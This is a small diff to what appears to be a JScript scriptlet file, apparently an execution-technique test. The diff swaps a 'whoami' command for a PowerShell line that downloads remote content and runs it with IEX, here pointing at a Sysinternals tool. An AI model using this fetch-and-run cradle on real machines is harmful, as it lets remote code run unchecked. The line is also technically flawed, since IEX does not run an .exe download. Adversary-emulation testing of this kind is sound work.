@@ -21,7 +21,7 @@
 	<script language="JScript">
 		<![CDATA[
  
-			var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c whoami > new.txt");
+			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -noninteractive IEX (New-Object System.Net.WebClient).Downloadstring('https://live.sysinternals.com/autoruns.exe')");
  
 		]]>
 	</script>
